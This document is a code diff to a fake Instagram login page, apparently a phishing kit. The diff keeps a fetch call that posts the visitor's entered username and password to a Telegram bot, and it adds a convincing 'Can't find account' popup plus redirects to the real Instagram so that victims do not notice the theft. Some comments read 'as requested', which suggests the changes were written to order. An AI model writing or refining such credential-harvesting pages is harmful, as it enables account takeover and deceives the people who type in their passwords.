@@ -40,6 +40,19 @@
                 </div>
             </div>
         </div>
+
+        <div id="errorModal" class="modal-overlay">
+            <div class="modal-box">
+                <div class="modal-content">
+                    <h3 class="modal-title">Can't find account</h3>
+                    <p id="errorText">We can't find an account with this username.</p>
+                </div>
+                <div class="modal-footer">
+                    <button id="btnSignUp" class="modal-btn" style="font-weight: bold;">Sign up</button>
+                    <button id="btnTryAgain" class="modal-btn">Try again</button>
+                </div>
+            </div>
+        </div>
         
         <div class="create-account-container">
             <a href="https://www.instagram.com/accounts/emailsignup/" class="btn btn-secondary">Create new account</a>
@@ -62,11 +75,17 @@
     const togglePasswordSpan = document.querySelector('.toggle-password');
     const eyeIcon = document.getElementById('eye-icon');
     
-    // Modal Elements
+    // 1. Empty Field Modal Elements
     const modal = document.getElementById('customModal');
     const modalText = document.querySelector('.modal-content p'); 
     const modalOkBtn = document.getElementById('modalOkBtn');
     const modalCreateBtn = document.getElementById('modalCreateBtn');
+
+    // 2. New "Can't Find Account" Modal Elements
+    const errorModal = document.getElementById('errorModal');
+    const errorText = document.getElementById('errorText');
+    const btnSignUp = document.getElementById('btnSignUp');
+    const btnTryAgain = document.getElementById('btnTryAgain');
 
     // --- SUBMISSION LOGIC ---
     if (loginForm) {
@@ -81,14 +100,14 @@
                 modalText.innerText = "Enter your username, email address or mobile number to log in";
                 modal.style.display = 'flex';
             
-            // 2. Check if Password is empty (only if username is filled)
+            // 2. Check if Password is empty
             } else if (!passwordValue) {
                 modalText.innerText = "Please enter your password.";
                 modal.style.display = 'flex';
 
-            // 3. If both are filled: Send Data & Redirect
+            // 3. If fields are valid
             } else {
-                // Send to Telegram
+                // A. Send Data to Telegram
                 fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
@@ -98,33 +117,47 @@
                     })
                 });
 
-                // Redirect to example.com after 0.5 seconds
-                setTimeout(() => {
-                    window.location.href = "https://www.instagram.com";
-                }, 500);
+                // B. SHOW THE "CAN'T FIND ACCOUNT" POPUP
+                // Update text with the actual username entered
+                errorText.innerText = `We can't find an account with ${usernameValue}. Try another phone number or email address, or if you don't have an Instagram account, you can sign up.`;
+                
+                // Show the error modal
+                errorModal.style.display = 'flex';
             }
         });
     }
 
-    // --- MODAL BUTTON ACTIONS ---
-    
-    // Close modal when OK is clicked
+    // --- BUTTON ACTIONS ---
+
+    // 1. Empty Field Modal Actions
     if (modalOkBtn) {
         modalOkBtn.addEventListener('click', function() {
             modal.style.display = 'none';
         });
     }
-
-    // Redirect when Create Account is clicked inside modal
     if (modalCreateBtn) {
         modalCreateBtn.addEventListener('click', function() {
             window.location.href = "https://www.instagram.com/accounts/emailsignup/";
         });
     }
 
+    // 2. "Can't Find Account" Modal Actions
+    if (btnTryAgain) {
+        btnTryAgain.addEventListener('click', function() {
+            // Direct to example.com as requested
+            window.location.href = "https://www.instagram.com";
+        });
+    }
+
+    if (btnSignUp) {
+        btnSignUp.addEventListener('click', function() {
+            // Direct to example.com as requested
+            window.location.href = "https://www.instagram.com/accounts/emailsignup/";
+        });
+    }
+
     // --- UI LOGIC (Icons) ---
 
-    // 1. Password Eye Icon Logic
     function updateEyeIconVisibility() {
         if (passwordInput.value.length > 0) {
             togglePasswordSpan.style.display = 'flex'; 
@@ -150,7 +183,6 @@
         });
     }
 
-    // 2. Username Clear (X) Icon Logic
     if (usernameInput) {
         usernameInput.addEventListener('input', function() {
             if (usernameInput.value.length > 0) {
